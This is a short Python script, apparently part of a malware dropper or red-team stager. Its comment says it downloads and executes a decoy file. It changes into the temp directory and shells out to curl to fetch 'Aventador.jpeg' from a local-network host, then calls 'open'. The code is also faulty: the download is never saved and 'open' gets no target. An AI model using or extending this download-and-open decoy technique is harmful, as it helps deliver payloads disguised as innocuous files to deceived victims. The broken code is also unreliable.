import subprocess
import os
import tempfile as tmp

### download and execute decoy file (i.e. Aventador.jpeg) ###

tempdir = str(tmp.gettempdir())
decoy_source = "http://192.168.1.23/files/Aventador.jpeg"
os.chdir(tempdir)
subprocess.call("curl " + decoy_source + " && open")
